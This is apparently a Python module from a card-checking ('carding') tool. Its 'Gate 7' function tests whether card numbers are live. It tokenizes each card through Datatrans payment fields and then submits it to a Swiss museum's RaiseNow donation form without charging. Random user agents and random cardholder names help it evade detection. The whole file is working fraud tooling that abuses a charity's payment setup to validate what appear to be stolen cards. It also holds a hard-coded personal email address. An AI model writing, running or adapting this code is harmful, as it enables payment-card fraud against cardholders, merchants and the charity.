import requests
import json
import logging
import random
import string
import time

# Lấy logger đã được cấu hình từ file chính
logger = logging.getLogger(__name__)

# --- CÁC HÀM TIỆN ÍCH ĐƯỢC SAO CHÉP TỪ FILE CHÍNH ---

def generate_random_string(length=8):
    """Generates a random string of characters."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_user_agent():
    """Generates a random realistic User-Agent string."""
    chrome_major = random.randint(100, 125)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    win_major = random.randint(10, 11)
    win_minor = random.randint(0, 3)
    win_build = random.randint(10000, 22631)
    win_patch = random.randint(0, 500)
    webkit_major = random.randint(537, 605)
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    win_version = f"{win_major}.{win_minor}; Win64; x64"
    return (
        f"Mozilla/5.0 (Windows NT {win_version}) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Safari/{safari_version}"
    )

def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

# --- LOGIC CỦA GATE 7 ---

def check_card_gate7(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount=None):
    """
    Logic for Gate 7 - Live Check (No charge).
    - Returns 'live_success' if the card requires 3D Secure.
    - Other cases (failed, error, unknown) are considered 'decline'.
    """
    try:
        # Generate random data for this request
        user_agent = random_user_agent()
        random_first_name = generate_random_string(random.randint(12, 20))
        random_last_name = generate_random_string(random.randint(10, 20))
        random_cardholder = f"{random_first_name} {random_last_name}"

        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = {
            "mode": "TOKENIZE", "formId": "250802162822879268", "cardNumber": cc,
            "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877",
            "browserUserAgent": user_agent, "browserJavaEnabled": "false", "browserLanguage": "en-US",
            "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420"
        }
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=mrw5i3faj",
            "X-Requested-With": "XMLHttpRequest", "User-Agent": user_agent, "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache", "Connection": "keep-alive", "Pragma": "no-cache",
            "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info
        
        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info
            
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # Step 2: Make payment source request (non-charging check)
        payment_url = "https://api.raisenow.io/payment-sources"
        payment_payload = {
            "account_uuid": "ed99e982-2f16-4643-be9d-9b31a66c3edf", "test_mode": False,
            "create_supporter": False, "amount": {"currency": "CHF", "value": 50},
            "supporter": {
                "locale": "de", 
                "first_name": random_first_name,
                "last_name": random_last_name,
                "email": "minhnhat4417@gmail.com", 
                "email_permission": False, 
                "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}
            },
            "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,12500,25000]", "user_agent": user_agent}, "solution": {"uuid": "09f67512-414e-4a70-ac58-08b999c47007", "name": "Spendenformular Blindenmuseum", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/dbhrx?lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}},
            "custom_parameters": {"campaign_id": "", "campaign_subid": ""},
            "payment_information": {
                "brand_code": "eca", 
                "cardholder": random_cardholder,
                "expiry_month": mes, 
                "expiry_year": ano, 
                "transaction_id": transaction_id
            },
            "profile": "5acd9b09-387a-4a89-a090-13b16c4a0032", "return_url": "https://donate.raisenow.io/dbhrx?lng=de&rnw-view=payment_result"
        }
        payment_headers = {
            "Content-Type": "application/json", "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent,
            "Pragma": "no-cache", "Accept": "*/*"
        }

        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
        if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

        response_text = payment_response.text

        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info

        if '"payment_source_status":"pending"' in response_text:
            return 'live_success', line, response_text, bin_info
        elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text:
            return 'decline', line, response_text, bin_info
        else:
            return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 7 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 7 System Error: {e}", bin_info
